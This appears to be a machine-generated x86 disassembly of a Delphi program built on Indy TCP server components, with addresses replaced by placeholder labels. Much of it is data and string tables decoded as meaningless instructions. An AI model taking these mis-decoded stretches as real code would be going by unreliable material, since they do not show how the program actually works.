lea edx [ ebp - 0xc ]
mov eax esi
call sub_408120
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
call sub_404200
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bea8
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_403f64
lea eax [ ebp - 0x14 ]
call sub_403f40
lea eax [ ebp - 0xc ]
call sub_403f40
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ esi + eax ] 0x20
jbe r-xdata
inc [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_404544
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404200
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404460
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404460
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_408120
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_46591c
mov esi eax
test esi esi
jg r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_408120
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_46beb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bed5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bedc
retn
sub_46bee8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46bf2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418258
cmp ebx [ eax + 0x8 ]
seta [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4182bc
retn
sub_46bf40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bf65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf6c
retn
sub_46bf78
les edi [ edi + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 8 ] al
inc esi
add [ eax + eax ] bh
add [ eax ] al
test [ ebx + 0x46 ] bl
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al dl
rol [ esi ] 0x8c
test [ ecx ] eax
push eax
0x84a80041 0x41
sub_46c108
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ esi + 0x30 ] eax
mov [ esi + 0x38 ] 0x3
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46c150
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46c1bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_465880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c1c6
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_46c1d0
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x30 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46c204
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c229
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c230
retn
sub_46c3a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xc4
inc esi
add [ esp + eax * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
les eax [ esi ]
les eax [ cs : esi ]
cmp al 0x0
add [ eax ] al
hlt
sub_46c8f4
movsb [ edi ] [ esi ]
pushfd
inc esi
add [ ecx + ebp * 4 - 0x6303ffba ] bh
inc esi
add [ ebp + ebx * 4 - 0x62dbffba ] al
inc esi
add al ch
popfd
inc esi
add [ eax - 0x5c8bffba ] dl
inc esi
add [ eax ] bh
movsb [ edi ] [ esi ]
inc esi
add ah dl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + ebp * 4 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] bl
inc esi
add [ eax + eax ] ch
add ah dl
mov dl 0x46
add [ ebx + esi - 0x1cdbffc0 ] dh
jb r-xdata
push esp
add [ eax ] ch
mov ah 0x46
add [ eax + 0x240046dd ] ch
mov ah 0x46
add [ eax ] ah
mov ah 0x46
add al dh
fadd [ esi ]
mov eax 0xb80046dd
mov bh 0x46
add [ edi + esi * 4 - 0x21f3ffba ] ah
inc esi
add [ ebp + esi * 4 - 0x499bffba ] dl
inc esi
add [ eax ] al
inc [ eax ]
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
nop
inc eax
leave
inc esi
add [ edi ] al
push ss
push esp
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
jb r-xdata
push 0x64616572
loopne r-xdata
inc ecx
push esp
push 0x64616572
adc [ ecx + ecx * 2 + 0x64 ] edx
dec esp
imul esi [ ebx + 0x74 ] 0x72656e65
push esp
push 0x64616572
or [ edx ] cl
push 0x64616572
mov eax eax
xor dl cl
inc esi
add [ edi ] al
or eax 0x50644954
jb r-xdata
add ah al
mov dh 0x46
add al dl
mov bh 0x46
add [ ebx + esi * 4 + 0x540d0046 ] bl
dec ecx
push eax
jb r-xdata
fiadd [ esi ]
xchg esp eax
mov ch 0x46
jb r-xdata
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi + esi * 4 ] ch
inc esi
add al bl
jecxz r-xdata
inc eax
add [ ebx ] ah
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
inc ecx
inc ebp
js r-xdata
popad
or [ fs : edx ] cl
add [ esi + esi * 4 + 0x46 ] ah
inc esi
inc esi
add [ eax - 0x4d ] bh
inc esi
add [ eax ] al
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
outsb
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
jo r-xdata
add [ esi + 0x46 ] ch
add [ esi ] dl
push esp
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
inc eax
add al ah
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
enter 0x46 0xdc
xchg ebp eax
inc esi
add [ eax ] dl
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add al bh

outsd
inc ebp
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x48004661 ] bl
outsd
outsb
add [ edx + ecx * 8 ] ch
inc esi
nop
adc al 0xcb
inc esi
add [ eax ] cl
adc al 0x54
dec ecx
imul ebp [ edi + 0x6e ] 0x63784509
jo r-xdata
inc ecx
jb r-xdata
push esp
push 0x64616572
or eax 0x50644954
jo r-xdata
add [ eax + r-xdata ] dl
or [ edi ] dl
push esp
dec ecx
dec esp
imul esi [ ebx + 0x74 ] 0x78456e65
arpl [ ebp + 0x70 ] sp
je r-xdata
dec eax
fadd [ esi ]
xchg esp eax
fadd [ esi ]
pushad
fadd [ esi ]
or al 0x54
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x5bffbe7c ] ch
aad 0x46
add ah al
aad 0x46
jb r-xdata
jb r-xdata
push ebx
imul ebp [ edi + 0x6e ] 0x46c82000
add [ edx + esi * 2 + 0x408d0040 ] dh
add [ eax + 0x80046ca ] bh
sbb eax 0x53644954
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5306000f ] al
jb r-xdata
or ah cl
inc esi
add [ eax + 0xff0000 ] bh
add [ eax ] cl
int3
inc esi
push 0x64616572
add [ edx + ecx * 8 ] ch
imul ebp [ edi + 0x6e ] 0x6e657645
je r-xdata
add [ edx ] al
or [ edi ] al
outsd
outsb
inc ebp
jbe r-xdata
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430f0005 ] al
outsd
jb r-xdata
out dx al
inc ecx
dec eax
push 0x64616572
inc ebp
jbe r-xdata
jb r-xdata
dec ecx
push eax
jb r-xdata
inc ecx
push esp
push 0x64616572
or eax 0x50644954
jb r-xdata
add cl [ eax ]
pop es
jb r-xdata
push 0x64616572
or [ edx ] cl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] bh
add bh bh
js r-xdata
inc eax
add [ esp + ecx * 8 ] cl
inc esi
add [ edi ] al
or al 0x54
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
xor [ eax ] eax
sub al 0xd2
outsb
je r-xdata
push ebx
push 0x64616572
add [ eax ] bh
jmp r-xdata
inc esi
inc esi
add [ ebx + ecx * 8 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xcc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ fs : edx + ecx * 8 ] ch
int3
jo r-xdata
add cl [ eax ]
pop es
or eax [ eax ]
or ecx [ ecx + ebp * 2 + 0x73 ]
je r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push es
add [ esi ] dl
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add eax 0x6f430f00
jb r-xdata
add [ eax ] ecx
pop es
inc ecx
imul ebp [ edi + 0x6e ] 0x63784509
jo r-xdata
add [ eax ] al
inc [ ecx ]
outsb
push ecx
jne r-xdata
outsb
outsb
pop esp
jne r-xdata
je r-xdata
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmp al 0x10
inc eax
add [ ebp + edx * 8 + r--data ] bl
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ ebx ] cl
inc esp
popa
jne r-xdata
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax - 0x2f ] dl
inc esi
add [ eax + 0x64 ] ah
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add ah bh
rol [ esi ] cl
cmp bl dl
inc esi
add [ eax - 0x2d ] dh
inc esi
add al dl
fiadd [ esi ]
sbb dh dl
inc esi
add [ eax ] dh
fadd [ esi ]
inc eax
fadd [ esi ]

add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + edx * 8 ] ch
add [ edx + esi * 2 + 0x14900040 ] dh

imul ebp [ edi + 0x6e ] 0x46ca2c00

jb r-xdata
add [ eax ] al
jne r-xdata
adc [ eax ] al
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax + eax + r--data ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or [ ecx + 0x6e ] ecx
je r-xdata
mov edx 0x880046
insb
jb r-xdata
je r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ecx + 0x46 ] bh
add [ eax + eax + 0x94ff00 ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
adc cl [ ebp + 0x61 ]
js r-xdata
add [ eax + 0x4d12000c ] al
jb r-xdata
popad
or [ eax + eax ] 0x12
dec ebp
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4909000a ] al
dec edi
dec eax
popad
outsb
outsd
jb r-xdata
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jo r-xdata
retn 0x46
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x66416e4f ] dl
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ ecx + 0x46 ] bh
add [ eax + eax ] bh
add [ eax - 0x80000000 ] al
lldt [ esi ]
dec edi
jns r-xdata
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0012 ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ esp + esi * 4 - 0x36 ] si
inc esi
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0013 ] al
outsb
inc ebp
js r-xdata
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ eax + 0x4f15000e ] al
outsb
inc ecx
je r-xdata
add [ eax ] al
adc [ eax ] al
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x614d0e00
js r-xdata
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52120016 ] al
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090010 ] al
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + edx - 0x35 ] si
inc esi
add al bl
add [ eax ] al

outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc [ ecx ]
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
inc [ ecx ]
jns r-xdata
jo r-xdata
push ss
add [ edx ] dl
push edx
imul ebp [ edi + 0x6e ] r-xdata
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f16000f ] al
retn 0x46
add [ eax ] al
add [ eax ] al
add [ eax - 0x30 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
push ebx
outsd
add [ eax ] al
js r-xdata
add bh bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5409001b ] al
push 0x64616572
dec ebp
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + eax + 0x1ff00 ]
inc [ ecx ]
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
add bh bh
mov al [ 0x1ff0000 ]
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
adc [ edi + 0x6e ] ecx
dec esp
imul esi [ ebx + 0x74 ] 0x78456e65
arpl [ ebp + 0x70 ] sp
je r-xdata
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x7c ] eax
xor ecx ecx
imul ebp [ esi + 0x61 ] 0x68546574
jb r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc eax 0x4e644945
jb r-xdata
jmp [ eax + 0x1ff0000 ]
jo r-xdata
je r-xdata
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
inc ebx
outsd
insd
insd
popad
outsb
rcl [ fs : esi + eax * 2 ] 0xa0
add [ eax ] al
or edx [ edx + 0x65 ]
jne r-xdata
imul ebp [ edi + 0x6e ] 0x65646f43
sbb [ edx + 0x46 ] bh
add [ eax + eax + 0x9cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ edx ] cl
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x520a0017 ] al
outsd
outsb
xor al 0xc3
inc esi
add al ch
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
popad
push esp
popad
je r-xdata
arpl [ ebp + 0x74 ] si
push ebx
jo r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
and al 0xd0
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] bl
inc ebp
dec ecx
push esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xd1
outsd
jb r-xdata
jb r-xdata
push edi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] dl
inc ebp
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
popad
push edi
imul esi [ esp + edx * 2 + 0x69 ] 0xc014656d
inc esi
add [ edx + ebx * 8 + r--data ] bl
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x72 ] edx
popad
dec ebp
add [ eax + 0x1388 ] al
sbb al [ eax ]
adc [ ebp + 0x72 ] edx
insd
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
inc esi
add al ch
stc
test al 0xff
dec [ ecx - 0x36cc83ba ]
leave
mov dl 0x1
imul ebp [ ebp + 0x65 ] 0x8b74756f
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
push esp
push 0x64616572
push esp
arpl [ ecx + 0x66 ] bp
imul esp [ ebp + 0x64 ] 0xd134c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
inc ebp
js r-xdata
rcl al 0xd0
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
rol [ esi ] 0x1
or al 0x0
add [ eax ] al
and al 0xd0
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x4e644945 ] dl
arpl [ ebx + 0x65 ] bp
je r-xdata
js r-xdata
imul ebp [ esi + 0x61 ] 0x61576574
jae r-xdata
jns r-xdata
push edx
jne r-xdata
add [ eax + 0x52130018 ] al
jo r-xdata
add ah dh
add [ eax ] al
push esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sub_46d150
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466280
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_467224
mov [ esi + 0x70 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_467e74
mov [ esi + 0x9c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46df8c
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46d22c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
cmp [ esi + 0x88 ] 0x0
je r-xdata
lea eax [ esi + 0x70 ]
call sub_40d3ac
lea eax [ esi + 0xf4 ]
call sub_40d3ac
lea eax [ esi + 0x9c ]
call sub_40d3ac
lea eax [ esi + 0xac ]
call sub_40d3ac
lea eax [ esi + 0x94 ]
call sub_40d3ac
lea eax [ esi + 0x7c ]
call sub_40d3ac
lea eax [ esi + 0x74 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466318
test bl bl
jle r-xdata
cmp [ esi + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
lea eax [ esi + 0x88 ]
call sub_40d3ac
sub_46d2fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x7c ]
mov eax [ ebx + 0x9c ]
call sub_467f0c
mov edx [ ebx + 0x7c ]
mov eax [ esi + 0x68 ]
call sub_46addc
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46d370
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d4ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_418bec
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4d1
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_404200
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d2dc
xor eax eax
push ebp
push sub_46d486
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_418bec
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d2bc
retn
inc eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_418bec
dec eax
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
test al al
jne r-xdata
inc ebx
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46d504
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_46dfd0
mov esi eax
cmp [ esi + 0x19 ] 0x0
je r-xdata
sub_46d504
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_46d590
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xea ] 0x0
je r-xdata
mov eax [ ebx + 0xf4 ]
call sub_467dac
test al al
je r-xdata
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov edx [ ebx + 0xf4 ]
mov eax [ esi + 0x68 ]
call sub_46addc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d597
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46d5a4
push ebx
mov ebx eax
mov eax ebx
call sub_41eb28
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_46d5c4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
